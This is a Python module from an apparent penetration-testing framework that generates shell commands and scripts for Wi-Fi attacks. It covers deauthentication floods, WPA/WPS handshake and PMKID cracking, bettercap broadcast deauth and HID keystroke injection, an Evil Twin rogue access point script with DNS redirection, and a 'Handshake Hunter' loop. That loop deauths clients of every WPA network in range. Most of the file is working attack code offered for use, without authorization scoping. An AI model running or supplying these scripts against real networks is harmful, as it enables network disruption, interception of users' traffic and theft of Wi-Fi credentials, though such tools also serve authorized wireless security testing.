#!/usr/bin/env python3
"""
NexusPen - Wireless Tools Integration Module
==============================================
Integration with popular wireless security tools.
"""

import subprocess
from typing import Dict, List, Optional
from dataclasses import dataclass

from rich.console import Console

console = Console()


class Aircrack:
    """
    Aircrack-ng suite wrapper.
    """
    
    @staticmethod
    def check_installation() -> bool:
        """Check if aircrack-ng is installed."""
        try:
            result = subprocess.run(['aircrack-ng', '--help'], capture_output=True)
            return True
        except FileNotFoundError:
            return False
    
    @staticmethod
    def airmon_start(interface: str) -> str:
        """Start monitor mode."""
        cmd = f'''
# Start monitor mode
airmon-ng check kill
airmon-ng start {interface}

# Verify
iwconfig {interface}mon
'''
        return cmd
    
    @staticmethod
    def airmon_stop(interface: str) -> str:
        """Stop monitor mode."""
        return f'''
# Stop monitor mode
airmon-ng stop {interface}mon

# Restart NetworkManager
service NetworkManager restart
'''
    
    @staticmethod
    def airodump_scan(interface: str, output: str = 'scan') -> str:
        """Scan networks with airodump-ng."""
        return f'''
# Basic scan
airodump-ng {interface}

# Save to file
airodump-ng -w {output} --output-format csv,cap {interface}

# Specific band
airodump-ng --band abg {interface}

# With WPS info
airodump-ng --wps {interface}
'''
    
    @staticmethod
    def airodump_target(interface: str, bssid: str, channel: int,
                       output: str = 'target') -> str:
        """Target specific AP."""
        return f'''
# Target specific AP for handshake capture
airodump-ng -c {channel} --bssid {bssid} -w {output} {interface}
'''
    
    @staticmethod
    def aireplay_deauth(interface: str, bssid: str, 
                       client: str = None, count: int = 0) -> str:
        """Deauthentication attack."""
        cmd = f'aireplay-ng -0 {count} -a {bssid}'
        if client:
            cmd += f' -c {client}'
        cmd += f' {interface}'
        
        return f'''
# Deauth attack
{cmd}

# Options:
# -0 [count]: deauth packets (0=continuous)
# -a [bssid]: target AP
# -c [client]: target client (optional)
'''
    
    @staticmethod
    def aircrack_crack(cap_file: str, wordlist: str) -> str:
        """Crack captured handshake."""
        return f'''
# Crack WPA/WPA2
aircrack-ng -w {wordlist} {cap_file}

# With specific ESSID
aircrack-ng -w {wordlist} -e "NetworkName" {cap_file}

# PTW attack for WEP
aircrack-ng -z {cap_file}

# JTR format output
aircrack-ng -J output {cap_file}
'''


class Wifite:
    """
    Wifite2 automated WiFi hacking tool.
    """
    
    @staticmethod
    def basic_scan() -> str:
        """Basic wifite scan."""
        return '''
# Scan and display networks
wifite

# Kill interfering processes
wifite --kill

# Specific interface
wifite -i wlan0
'''
    
    @staticmethod
    def wpa_attack() -> str:
        """WPA attack with wifite."""
        return '''
# WPA attack
wifite --wpa

# With PMKID
wifite --wpa --pmkid

# With wordlist
wifite --wpa --dict /path/to/wordlist.txt

# Infinite deauths
wifite --wpa --no-deauths
'''
    
    @staticmethod
    def wps_attack() -> str:
        """WPS attack with wifite."""
        return '''
# WPS only
wifite --wps

# Pixie Dust only
wifite --wps-only --pixie

# With time limits
wifite --wps --wps-time 300
'''
    
    @staticmethod
    def all_attacks() -> str:
        """All attacks with wifite."""
        return '''
# All attacks
wifite --all

# With cracking
wifite --all --dict /usr/share/wordlists/rockyou.txt

# Quiet mode
wifite -q
'''


class Bettercap:
    """
    Bettercap network attack framework.
    """
    
    @staticmethod
    def wifi_recon() -> str:
        """WiFi reconnaissance with bettercap."""
        return '''
# Start bettercap in WiFi mode
sudo bettercap -iface wlan0

# Recon commands
> wifi.recon on
> wifi.show
> wifi.deauth FF:FF:FF:FF:FF:FF  # Broadcast deauth

# Target specific
> wifi.recon.channel 6
> wifi.deauth [CLIENT] [AP]
'''
    
    @staticmethod
    def ble_recon() -> str:
        """BLE reconnaissance with bettercap."""
        return '''
# BLE with bettercap
sudo bettercap

> ble.recon on
> ble.show
> ble.enum [MAC]
> ble.write [MAC] [HANDLE] [VALUE]
'''
    
    @staticmethod
    def hid_injection() -> str:
        """HID injection with bettercap."""
        return '''
# HID (keyboard) injection
> hid.recon on
> hid.show
> hid.inject [MAC] [SCRIPT]

# Script format: DuckyScript
'''
    
    @staticmethod
    def caplets() -> str:
        """Useful bettercap caplets."""
        return '''
# WiFi monitoring
sudo bettercap -iface wlan0 -caplet wifi-recon

# Deauth all
sudo bettercap -iface wlan0 -eval "wifi.recon on; wifi.deauth *"

# Custom caplet
sudo bettercap -caplet /path/to/custom.cap
'''


class Kismet:
    """
    Kismet wireless network detector.
    """
    
    @staticmethod
    def basic_usage() -> str:
        """Basic Kismet usage."""
        return '''
# Start Kismet
kismet

# With specific source
kismet -c wlan0

# Multiple sources
kismet -c wlan0 -c wlan1

# Web interface
# Access at http://localhost:2501
# Default creds: kismet/kismet
'''
    
    @staticmethod
    def datasources() -> str:
        """Kismet data sources."""
        return '''
# WiFi sources
kismet -c wlan0:name=wifi1,hop=true,channels="1,6,11"

# RTL-SDR source
kismet -c rtlsdr-0:name=sdr1

# Bluetooth source
kismet -c hci0:name=bt1

# nRF mouse source
kismet -c nrf-0:name=mouse
'''
    
    @staticmethod
    def remote_capture() -> str:
        """Remote Kismet capture."""
        return '''
# On remote sensor
kismet_cap_linux_wifi --source=wlan0 --connect=[SERVER]:3501

# On server
kismet --listen=0.0.0.0:3501
'''


class Hashcat:
    """
    Hashcat for WiFi cracking.
    """
    
    @staticmethod
    def convert_capture(cap_file: str) -> str:
        """Convert capture for hashcat."""
        return f'''
# Convert with hcxpcapngtool (recommended)
hcxpcapngtool -o hashes.hc22000 {cap_file}

# Old method with cap2hccapx
cap2hccapx {cap_file} capture.hccapx
'''
    
    @staticmethod
    def crack_pmkid(hash_file: str, wordlist: str) -> str:
        """Crack PMKID/EAPOL with hashcat."""
        return f'''
# Mode 22000: PMKID + EAPOL (new format)
hashcat -m 22000 {hash_file} {wordlist} -O --force

# With rules
hashcat -m 22000 {hash_file} {wordlist} -r /usr/share/hashcat/rules/best64.rule

# Bruteforce 8 digits
hashcat -m 22000 {hash_file} -a 3 ?d?d?d?d?d?d?d?d

# Status check
hashcat -m 22000 {hash_file} --status
'''
    
    @staticmethod
    def crack_old_format(hccapx_file: str, wordlist: str) -> str:
        """Crack old hccapx format."""
        return f'''
# Mode 2500: WPA/WPA2 (old hccapx)
hashcat -m 2500 {hccapx_file} {wordlist}

# Mode 16800: WPA-PMKID-PBKDF2
hashcat -m 16800 pmkid.hash {wordlist}
'''


class Fern:
    """
    Fern WiFi Cracker GUI tool.
    """
    
    @staticmethod
    def usage() -> str:
        """Fern usage."""
        return '''
# Start Fern WiFi Cracker
fern-wifi-cracker

# Features:
# - GUI based
# - WEP cracking (various attacks)
# - WPA/WPA2 cracking
# - WPS attacks
# - Session hijacking
# - Geolocation tracking
'''


class WiFiAutomation:
    """
    Automated WiFi assessment scripts.
    """
    
    @staticmethod
    def full_assessment(interface: str) -> str:
        """Full automated assessment."""
        return f'''
#!/bin/bash
# Full WiFi Assessment Script

IFACE={interface}
OUTDIR="wifi_assessment_$(date +%Y%m%d_%H%M%S)"
mkdir -p $OUTDIR

echo "[*] Starting WiFi assessment..."

# 1. Enable monitor mode
airmon-ng check kill
airmon-ng start $IFACE

# 2. Scan networks
timeout 60 airodump-ng -w $OUTDIR/scan --output-format csv,cap ${{IFACE}}mon &
sleep 60
killall airodump-ng

# 3. Parse results
echo "[*] Networks found:"
cat $OUTDIR/scan-01.csv | grep -E "^([0-9A-F]{{2}}:){{5}}[0-9A-F]{{2}}" | head -20

# 4. Check for WPS
echo "[*] Checking WPS status..."
wash -i ${{IFACE}}mon -s > $OUTDIR/wps_scan.txt 2>/dev/null &
sleep 30
killall wash

# 5. Attempt PMKID capture
echo "[*] Attempting PMKID capture..."
timeout 60 hcxdumptool -i ${{IFACE}}mon -o $OUTDIR/pmkid.pcapng --enable_status=1

# 6. Convert captures
hcxpcapngtool -o $OUTDIR/hashes.hc22000 $OUTDIR/*.cap $OUTDIR/*.pcapng 2>/dev/null

# 7. Cleanup
airmon-ng stop ${{IFACE}}mon
service NetworkManager restart

echo "[*] Assessment complete. Results in $OUTDIR"
'''
    
    @staticmethod
    def evil_twin_script() -> str:
        """Evil Twin automation script."""
        return '''
#!/bin/bash
# Evil Twin Attack Script

if [ -z "$1" ] || [ -z "$2" ]; then
    echo "Usage: $0 <SSID> <CHANNEL>"
    exit 1
fi

SSID="$1"
CHANNEL="$2"
IFACE="wlan0"

# Create hostapd config
cat > /tmp/hostapd.conf << EOF
interface=$IFACE
driver=nl80211
ssid=$SSID
hw_mode=g
channel=$CHANNEL
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=0
EOF

# Create dnsmasq config
cat > /tmp/dnsmasq.conf << EOF
interface=$IFACE
dhcp-range=192.168.1.10,192.168.1.100,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
address=/#/192.168.1.1
EOF

# Configure interface
ip link set $IFACE down
ip addr flush dev $IFACE
ip addr add 192.168.1.1/24 dev $IFACE
ip link set $IFACE up

# Enable forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -F
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Start services
dnsmasq -C /tmp/dnsmasq.conf &
hostapd /tmp/hostapd.conf

# Cleanup on exit
trap "killall dnsmasq hostapd; ip link set $IFACE down" EXIT
'''
    
    @staticmethod
    def handshake_hunter() -> str:
        """Automated handshake capture script."""
        return '''
#!/bin/bash
# Handshake Hunter - Auto-capture handshakes

IFACE="wlan0mon"
OUTDIR="handshakes_$(date +%Y%m%d)"
mkdir -p $OUTDIR

echo "[*] Scanning for targets..."
timeout 30 airodump-ng -w /tmp/scan --output-format csv $IFACE
killall airodump-ng 2>/dev/null

# Parse targets (WPA/WPA2 networks with clients)
cat /tmp/scan-01.csv | grep -E "WPA|WPA2" | while read line; do
    BSSID=$(echo $line | cut -d',' -f1 | tr -d ' ')
    CHANNEL=$(echo $line | cut -d',' -f4 | tr -d ' ')
    ESSID=$(echo $line | cut -d',' -f14 | tr -d ' ')
    
    if [ ! -z "$BSSID" ] && [ ! -z "$CHANNEL" ]; then
        echo "[*] Targeting: $ESSID ($BSSID) on channel $CHANNEL"
        
        # Start capture
        timeout 120 airodump-ng -c $CHANNEL --bssid $BSSID -w $OUTDIR/$ESSID $IFACE &
        CAP_PID=$!
        
        sleep 5
        
        # Deauth
        aireplay-ng -0 5 -a $BSSID $IFACE
        
        sleep 30
        
        # Check for handshake
        if aircrack-ng $OUTDIR/$ESSID-01.cap 2>/dev/null | grep -q "1 handshake"; then
            echo "[+] Handshake captured for $ESSID!"
            kill $CAP_PID 2>/dev/null
        fi
    fi
done

echo "[*] Done. Check $OUTDIR for captures."
'''
